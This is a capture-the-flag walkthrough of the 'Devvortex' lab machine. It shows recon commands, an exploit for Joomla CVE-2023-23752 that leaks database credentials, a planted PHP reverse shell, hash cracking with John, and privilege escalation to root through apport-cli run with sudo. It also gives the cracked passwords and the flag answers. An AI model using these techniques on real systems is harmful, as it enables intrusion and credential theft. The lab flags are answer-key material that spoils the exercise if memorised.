# Devvortex

> IP: [10.10.11.242]

## NOTES / STEPS

1. Deploy Machine
2. NMAP
   1. > nmap -sC -sV 10.10.11.242 -oN init_scan
      1. Port 22 -> ssh
      2. Port 80 -> http
         1. http-title: Did not follow redirect to http://devvortex.htb/
         2. Need to add this to /ect/hosts
3. HTTP
   1. Navigate to website and inspect source code
      1. Nothing stands out
         1. Built with bootstrap & jquery
      2. There is a contact form and email newsletter form (potenital for XSS)
   2. CONTACT-FORM & NEWSLETTER
      1. INPUT FIELDS: <script>alert(1);</script>
         1. Nothing
   3. GOBUSTER
      1. Directories & Files
         1. > gobuster dir -x php,txt,html -u http://devvortex.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
            1. /images
            2. /css
            3. /js
            4. PAGES (we found with manual enumeration)
               1. index.html
               2. about.html
               3. contact.html
               4. do.html
               5. portfolio.html
      2. Subdomains
         1. > gobuster vhost -u http://devvortex.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
            1. Nothing
         2. > gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
            1. dev.devvortex.htb
   4. GOBUSTER (dev.devvortex.htb)
      1. > gobuster dir -x php,txt,html -u http://dev.devvortex.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
         1. /media
         2. /templates
         3. /modules
         4. /plugins
         5. /includes
         6. robots.txt

            ```text
                # If the Joomla site is installed within a folder
                # eg www.example.com/joomla/ then the robots.txt file
                # MUST be moved to the site root
                # eg www.example.com/robots.txt
                # AND the joomla folder name MUST be prefixed to all of the
                # paths.
                # eg the Disallow rule for the /administrator/ folder MUST
                # be changed to read
                # Disallow: /joomla/administrator/
                #
                # For more information about the robots.txt standard, see:
                # https://www.robotstxt.org/orig.html

                User-agent: *
                Disallow: /administrator/
                Disallow: /api/
                Disallow: /bin/
                Disallow: /cache/
                Disallow: /cli/
                Disallow: /components/
                Disallow: /includes/
                Disallow: /installation/
                Disallow: /language/
                Disallow: /layouts/
                Disallow: /libraries/
                Disallow: /logs/
                Disallow: /modules/
                Disallow: /plugins/
                Disallow: /tmp/
            ```

            1. This tells me that the backend is built on joomla
   5. /ADMINISTRATOR
      1. This brings us to the login page
4. RESEARCH
   1. After trying some SQLi injections, XSS, and default credentials we need to find another attack avenue
   2. I found a tool called JOOMSCAN
5. JOOMSCAN
   1. > joomscan -u dev.devvortex.htb
      1. Joomla 4.2.6
      2. Bingo! We have a version so we can do some more research and see if there are any known vulnerabilities
6. RESEARCH PT.2
   1. Joomla 4.2.6
      1. CVE-2023-23752
         1. "An issue was discovered in Joomla! 4.0.0 through 4.2.7. An improper access check allows unauthorized access to webservice endpoints." - NIST
         2. Clone this tool
            1. > git clone https://github.com/Acceis/exploit-CVE-2023-23752.git
7. EXPLOIT
   1. Lets run our ruby exploit script we found
      1. > ruby exploit.rb http://dev.devvortex.htb

            ```text
                Users
                [649] lewis (lewis) - lewis@devvortex.htb - Super Users
                [650] logan paul (logan) - logan@devvortex.htb - Registered

                Site info
                Site name: Development
                Editor: tinymce
                Captcha: 0
                Access: 1
                Debug status: false

                Database info
                DB type: mysqli
                DB host: localhost
                DB user: lewis
                DB password: P4ntherg0t1n5r3c0n##
                DB name: joomla
                DB prefix: sd4fg_
                DB encryption 0
            ```

            1. Now we have some crucial information about the database and users
            2. Lets sign in
               1. UN: lewis
               2. PW: P4ntherg0t1n5r3c0n##
8. JOOMLA
   1. Navigate to site templates
   2. In the login (or any php file) lets add our revshell code
   3. Create a netcat listner
   4. SUCCESS!
9. ENUMERATION
   1. Check user home directories
      1. > ls /home
         1. logan
      2. > ls /home/logan
         1. user.txt
         2. We can't read this though we need to escalate our privilges
   2. MYSQL
      1. We saw the MYSQL information from our ruby exploit script lets try and sign in and see if there is data in there we could use
         1. > msql -u lewis -p "P4ntherg0t1n5r3c0n##"
      2. MYSQL
         1. > show databases;
         2. > use joomla;
         3. > show tables;

            ```text
                +-------------------------------+
                | Tables_in_joomla              |
                +-------------------------------+
                | sd4fg_action_log_config       |
                | sd4fg_action_logs             |
                | sd4fg_action_logs_extensions  |
                | sd4fg_action_logs_users       |
                | sd4fg_assets                  |
                | sd4fg_associations            |
                | sd4fg_banner_clients          |
                | sd4fg_banner_tracks           |
                | sd4fg_banners                 |
                | sd4fg_categories              |
                | sd4fg_contact_details         |
                | sd4fg_content                 |
                | sd4fg_content_frontpage       |
                | sd4fg_content_rating          |
                | sd4fg_content_types           |
                | sd4fg_contentitem_tag_map     |
                | sd4fg_extensions              |
                | sd4fg_fields                  |
                | sd4fg_fields_categories       |
                | sd4fg_fields_groups           |
                | sd4fg_fields_values           |
                | sd4fg_finder_filters          |
                | sd4fg_finder_links            |
                | sd4fg_finder_links_terms      |
                | sd4fg_finder_logging          |
                | sd4fg_finder_taxonomy         |
                | sd4fg_finder_taxonomy_map     |
                | sd4fg_finder_terms            |
                | sd4fg_finder_terms_common     |
                | sd4fg_finder_tokens           |
                | sd4fg_finder_tokens_aggregate |
                | sd4fg_finder_types            |
                | sd4fg_history                 |
                | sd4fg_languages               |
                | sd4fg_mail_templates          |
                | sd4fg_menu                    |
                | sd4fg_menu_types              |
                | sd4fg_messages                |
                | sd4fg_messages_cfg            |
                | sd4fg_modules                 |
                | sd4fg_modules_menu            |
                | sd4fg_newsfeeds               |
                | sd4fg_overrider               |
                | sd4fg_postinstall_messages    |
                | sd4fg_privacy_consents        |
                | sd4fg_privacy_requests        |
                | sd4fg_redirect_links          |
                | sd4fg_scheduler_tasks         |
                | sd4fg_schemas                 |
                | sd4fg_session                 |
                | sd4fg_tags                    |
                | sd4fg_template_overrides      |
                | sd4fg_template_styles         |
                | sd4fg_ucm_base                |
                | sd4fg_ucm_content             |
                | sd4fg_update_sites            |
                | sd4fg_update_sites_extensions |
                | sd4fg_updates                 |
                | sd4fg_user_keys               |
                | sd4fg_user_mfa                |
                | sd4fg_user_notes              |
                | sd4fg_user_profiles           |
                | sd4fg_user_usergroup_map      |
                | sd4fg_usergroups              |
                | sd4fg_users                   |
                | sd4fg_viewlevels              |
                | sd4fg_webauthn_credentials    |
                | sd4fg_workflow_associations   |
                | sd4fg_workflow_stages         |
                | sd4fg_workflow_transitions    |
                | sd4fg_workflows               |
                +-------------------------------+
            ```

            1. Lets checkout the "sd4fg_users" table
         4. > select * from sd4fg_users;
            1. lewis:$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
            2. logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
               1. Maybe we can crack these hashes
10. CRACK THE HASH
    1. Creat hash.txt
       1. > echo 'logan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
    2. JOHN
       1. > john ./hash.txt --wordlist=/opt/rockyou.txt
          1. RESPONSE: "tequieromucho"
          2. Bingo! Now we have a username and password
11. SSH 
    1. We could switch users with our current revshell, but lets ssh in as logan instead
       1. > ssh logan@
          1. PW: tequieromucho
12. ENUMERATION
    1. Check for sudo priliveges (if any)
       1. > sudo -l

            ```text
                Matching Defaults entries for logan on devvortex:
                    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

                User logan may run the following commands on devvortex:
                    (ALL : ALL) /usr/bin/apport-cli
            ```

            1. It looks like we can run /usr/bin/apport-cli as root
    2. Get user flag
       1. > cat /home/logan/user.txt
          1. FLAG: `285bd04e935944bee2c87eded0f9c776`
    3. RESEARCH
       1. Apport-cli -> this looks like it is a tool that automatically collects data from crashed processes and compiles a problem report (man page)
       2. Apport-cli exploit -> looks like we can run this as sudo and generate a crash report, then use !/bin/bash to get a shell
13. EXPLOIT
    1. Lets try running our apport-cli as sudo and then runing bash
       1. > sudo /usr/bin/apport-cli --file-bug
          1. Create the report
          2. Then VIEW the report - this is important as this is where we use the : !/bin/bash
          3. > !/bin/bash
             1. SUCCESS
    2. ROOT
       1. Get the root flag
          1. > cat /root/root.txt
             1. FLAG: `7176c68ae79eb1c85f863bd045e84bcd`

## QUESTIONS

1. Submit user flag
   1. `285bd04e935944bee2c87eded0f9c776`
2. Submit root flag
   1. `7176c68ae79eb1c85f863bd045e84bcd`
